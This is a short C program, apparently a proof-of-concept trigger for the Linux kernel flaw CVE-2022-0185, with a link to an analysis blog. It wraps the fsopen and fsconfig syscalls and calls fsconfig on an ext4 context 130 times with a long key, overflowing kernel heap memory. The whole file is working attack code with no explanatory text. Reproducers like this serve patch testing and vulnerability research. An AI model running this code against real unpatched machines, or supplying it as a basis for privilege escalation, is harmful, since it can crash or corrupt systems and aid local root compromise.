// ref:
//   - https://bsauce.github.io/2022/04/08/CVE-2022-0185/
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sys/syscall.h>
#include <unistd.h>

#ifndef __NR_fsconfig
#define __NR_fsconfig 431
#endif
#ifndef __NR_fsopen
#define __NR_fsopen 430
#endif
#define FSCONFIG_SET_STRING 1
#define fsopen(name, flags) syscall(__NR_fsopen, name, flags)
#define fsconfig(fd, cmd, key, value, aux)                                     \
    syscall(__NR_fsconfig, fd, cmd, key, value, aux)

int main(void) {
    char *key = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
    int fd = 0;
    fd = fsopen("ext4", 0);
    if (fd < 0) {
        perror("fsopen");
    }
    for (int i = 0; i < 130; i++) {
        int res = fsconfig(fd, FSCONFIG_SET_STRING, "\x00", key, 0);
        if (res < 0) {
            perror("fsconfig");
        }
    }
}
